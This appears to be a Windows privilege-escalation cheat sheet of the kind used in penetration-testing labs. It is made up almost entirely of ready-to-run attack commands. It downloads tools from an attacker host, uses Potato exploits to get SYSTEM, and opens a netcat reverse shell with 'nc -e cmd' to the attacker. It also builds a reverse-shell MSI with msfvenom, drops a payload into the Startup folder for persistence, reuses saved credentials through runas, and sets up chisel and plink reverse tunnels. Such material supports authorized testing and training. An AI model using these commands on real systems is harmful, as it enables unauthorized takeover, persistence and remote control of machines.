### Service Exploitation
#### Service Enumeration
```powershell
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows\*' } | Select-Object Name,PathName,StartMode,StartName | Out-File services_nonstandard.txt
```

#### Check Service Permissions
> Look for **SERVICE_ALL_ACCESS**, **SERVICE_CHANGE_CONFIG**, **WRITE_DAC**, **WRITE_OWNER**.

```powershell
# Download accesschk
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/accesschk.exe','ac.exe')

.\ac.exe /accepteula -uwcqv "Everyone" * > accesschk_everyone.txt 2>&1
.\ac.exe /accepteula -uwcqv "Authenticated Users" * > accesschk_authusers.txt 2>&1
.\ac.exe /accepteula -uwcqv "Users" * > accesschk_users.txt 2>&1
```

#### Unquoted Service Path Check
```powershell
Get-CimInstance Win32_Service | Where-Object {
    $_.StartMode -eq 'Auto' -and
    $_.PathName -notlike 'C:\Windows\*' -and
    $_.PathName -like '* *' -and
    $_.PathName -notlike '"*'
} | Select-Object Name,PathName,StartMode | Out-File unquoted_paths.txt
```

#### Exploit Vulnerable Service
```cmd
sc config <ServiceName> binpath= "C:\path\to\reverse.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

---

### Token Impersonation - Potato Attacks
> If `whoami /priv` shows **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege**, this is your fast path to SYSTEM.

```powershell
whoami /priv | Select-String "SeImpersonate|SeAssignPrimaryToken"
```

#### PrintSpoofer - Windows 10 and Server 2016+
> Most reliable for modern Windows.

```powershell
# Download
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/PrintSpoofer64.exe','ps.exe')

# Spawn SYSTEM cmd
.\ps.exe -i -c cmd

# Or run reverse shell
.\ps.exe -i -c "C:\path\reverse.exe"
```

#### GodPotato - Windows 2012-2022 [alternative]
> Newest potato, wide compatibility.

```powershell
# Download
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/GodPotato-NET4.exe','gp.exe')

# Spawn SYSTEM cmd
.\gp.exe -cmd "cmd /c whoami"

# Reverse shell with nc
.\gp.exe -cmd "C:\Users\Public\nc.exe -e cmd <KaliIP> <PORT>"
```

#### JuicyPotato - Windows 7 and Server 2008-2016 [alternative]
> Classic, reliable for older Windows. Requires CLSID for the OS version.

```powershell
# Download
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/JuicyPotato.exe','jp.exe')

.\jp.exe -l 1337 -p C:\path\reverse.exe -t *
```

---

### Scheduled Tasks and Autoruns

#### Enumerate Scheduled Tasks
```powershell
schtasks /query /fo LIST /v | Out-File schtasks.txt
Select-String -Path schtasks.txt -Pattern "SYSTEM|Task To Run"
```

#### Check Startup Folder Permissions
> If writable, drop payload and wait for admin login.

```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

```powershell
Copy-Item reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

#### Autorun Registry Check
```powershell
& {
    '=== HKLM RUN ==='
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    '=== HKCU RUN ==='
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
} | Out-File autoruns.txt
```

---

### AlwaysInstallElevated
> **Both** registry keys must return `0x1` to be exploitable.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Generate Malicious MSI - Kali
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KaliIP> LPORT=<PORT> -f msi -o shell.msi
```

#### Install MSI - Target
```cmd
msiexec /quiet /qn /i C:\path\shell.msi
```

---

### RDP-Specific Techniques [optional]
> If credentials are saved, use runas /savecred to execute as that user.

```powershell
cmdkey /list
runas /savecred /user:<Domain>\<Username> "C:\path\reverse.exe"
```

#### GUI Application Privilege Spawning [optional]
> If an application runs elevated (shield icon): Open the app, go to **File > Open**, type `file://c:/windows/system32/cmd.exe` in location bar, press Enter for admin cmd.

---

### Port Forwarding - Internal Services [optional]
> Use when services are only listening on 127.0.0.1.

#### Chisel Setup
```powershell
# Download chisel
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/chisel.exe','ch.exe')
```

#### Chisel - Kali Server
```bash
./chisel server -p 8000 --reverse
```

#### Chisel - SOCKS Proxy
```cmd
.\ch.exe client <KaliIP>:8000 R:socks
```

#### Chisel - Single Port Forward
```cmd
.\ch.exe client <KaliIP>:8000 R:<LocalPort>:127.0.0.1:<TargetPort>
```

#### Plink [alternative]
```cmd
plink.exe -l <KaliUser> -pw <Password> -R <KaliPort>:127.0.0.1:<TargetPort> <KaliIP>
```

---

### Kernel Exploits [optional]
> **Last resort only** - can crash the system. Misconfigurations are more reliable.

```bash
# On Kali - analyze systeminfo output
python wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
```
